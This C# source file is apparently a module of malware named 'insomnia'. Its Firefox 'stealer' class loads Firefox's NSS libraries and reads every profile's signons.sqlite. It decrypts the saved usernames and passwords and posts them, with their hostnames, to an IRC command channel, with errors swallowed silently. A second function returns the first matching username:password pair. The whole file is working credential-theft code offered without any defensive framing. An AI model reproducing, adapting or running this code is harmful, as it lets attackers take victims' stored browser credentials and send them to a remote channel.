using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;

namespace insomnia.Stealers
{
    class Firefox
    {
        /* Firefox 11.0 password recovery
         * File: signons.sqlite
         * Table: moz_logins (id, hostname, httpRealm, formSubmitURL, usernameField, passwordField, encryptedUsername, encryptedPassword, guid, encType)
         */
        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string dllFilePath);
        static IntPtr NSS3;

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate(string configdir);
        public static long NSS_Init(string configdir)
        {
            string MozillaPath = Environment.GetEnvironmentVariable("PROGRAMFILES") + @"\Mozilla Firefox\";
            Console.WriteLine("LoadLibrary: mozglue, nspr4, plc4, plds4, nssutil3, mozsqlite3, softokn3, nss3.");
            Console.WriteLine("NSS initialized to: " + configdir);
            LoadLibrary(MozillaPath + "mozglue.dll");
            LoadLibrary(MozillaPath + "nspr4.dll");
            LoadLibrary(MozillaPath + "plc4.dll");
            LoadLibrary(MozillaPath + "plds4.dll");
            LoadLibrary(MozillaPath + "nssutil3.dll");
            LoadLibrary(MozillaPath + "mozsqlite3.dll");
            LoadLibrary(MozillaPath + "softokn3.dll");
            NSS3 = LoadLibrary(MozillaPath + "nss3.dll");
            IntPtr pProc = GetProcAddress(NSS3, "NSS_Init");
            DLLFunctionDelegate dll = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate));
            return dll(configdir);
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate2();
        public static long PK11_GetInternalKeySlot()
        {
            IntPtr pProc = GetProcAddress(NSS3, "PK11_GetInternalKeySlot");
            DLLFunctionDelegate2 dll = (DLLFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate2));
            return dll();
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);
        public static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
        {
            IntPtr pProc = GetProcAddress(NSS3, "PK11_Authenticate");
            DLLFunctionDelegate3 dll = (DLLFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate3));
            return dll(slot, loadCerts, wincx);
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
        public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
        {
            IntPtr pProc = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer");
            DLLFunctionDelegate4 dll = (DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate4));
            return dll(arenaOpt, outItemOpt, inStr, inLen);
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);
        public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
        {
            IntPtr pProc = GetProcAddress(NSS3, "PK11SDR_Decrypt");
            DLLFunctionDelegate5 dll = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate5));
            return dll(ref data, ref result, cx);
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem
        {
            public int SECItemType;
            public int SECItemData;
            public int SECItemLen;
        }

        public static void GetLoginData(string keyword)
        {
            string profilesPath = Environment.GetEnvironmentVariable("APPDATA") + @"\Mozilla\Firefox\Profiles";

            try
            {
                foreach (string dir in Directory.GetDirectories(profilesPath))
                {
                    string signonsFile = Path.Combine(dir, "signons.sqlite");
                    if (File.Exists(signonsFile))
                    {
                        Console.WriteLine("Found: " + signonsFile);

                        NSS_Init(dir);
                        PK11_Authenticate(PK11_GetInternalKeySlot(), true, 0);

                        SQLiteHandler.SQLiteHandler sqlite = new SQLiteHandler.SQLiteHandler(signonsFile);
                        sqlite.ReadTable("moz_logins");

                        //              0      1        2             3              4             5              6                7                 8     9
                        // moz_logins (id, hostname, httpRealm, formSubmitURL, usernameField, passwordField, encryptedUsername, encryptedPassword, guid, encType)

                        int rowCount = sqlite.GetRowCount();
                        for (int i = 0; i < rowCount; i++)
                        {
                            string hostName = sqlite.GetValue(i, 1);
                            string username = DecryptData(sqlite.GetValue(i, 6));
                            string password = DecryptData(sqlite.GetValue(i, 7));
                            if (username != null && password != null)
                            {
                                if (String.IsNullOrEmpty(keyword))
                                    IRC.WriteMessage("Firefox ->" + IRC.ColorCode(" " + hostName) + " ->" + IRC.ColorCode(" " + username) + " :" + IRC.ColorCode(" " + password), Config._mainChannel());
                                else if (hostName.Contains(keyword))
                                    IRC.WriteMessage("Firefox ->" + IRC.ColorCode(" " + hostName) + " ->" + IRC.ColorCode(" " + username) + " :" + IRC.ColorCode(" " + password), Config._mainChannel());
                            }
                        }
                    }
                }
            }
            catch
            {
            }
        }

        public static string QueryFirefox(string keyword)
        {
            string profilesPath = Environment.GetEnvironmentVariable("APPDATA") + @"\Mozilla\Firefox\Profiles";
            try
            {
                foreach (string dir in Directory.GetDirectories(profilesPath))
                {
                    string signonsFile = Path.Combine(dir, "signons.sqlite");
                    if (File.Exists(signonsFile))
                    {
                        Console.WriteLine("Found: " + signonsFile);

                        NSS_Init(dir);
                        PK11_Authenticate(PK11_GetInternalKeySlot(), true, 0);

                        SQLiteHandler.SQLiteHandler sqlite = new SQLiteHandler.SQLiteHandler(signonsFile);
                        sqlite.ReadTable("moz_logins");

                        //              0      1        2             3              4             5              6                7                 8     9
                        // moz_logins (id, hostname, httpRealm, formSubmitURL, usernameField, passwordField, encryptedUsername, encryptedPassword, guid, encType)

                        int rowCount = sqlite.GetRowCount();
                        for (int i = 0; i < rowCount; i++)
                        {
                            string hostName = sqlite.GetValue(i, 1);
                            string username = DecryptData(sqlite.GetValue(i, 6));
                            string password = DecryptData(sqlite.GetValue(i, 7));
                            if (username != null && password != null)
                            {
                                if (String.IsNullOrEmpty(keyword))
                                    return username + ":" + password;
                                else if (hostName.Contains(keyword))
                                    return username + ":" + password;
                            }
                        }
                    }
                }
            }
            catch
            {
            }
            return null;
        }

        static string DecryptData(string input)
        {
            byte[] bvRet;
            TSECItem tSec = new TSECItem();
            StringBuilder se = new StringBuilder(input);
            int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se, se.Length);
            TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));
            if (PK11SDR_Decrypt(ref item, ref tSec, 0) == 0)
            {
                if (tSec.SECItemLen != 0)
                {
                    bvRet = new byte[tSec.SECItemLen];
                    Marshal.Copy(new IntPtr(tSec.SECItemData), bvRet, 0, tSec.SECItemLen);
                    return System.Text.Encoding.ASCII.GetString(bvRet);
                }
            }
            return null;
        }
    }
}
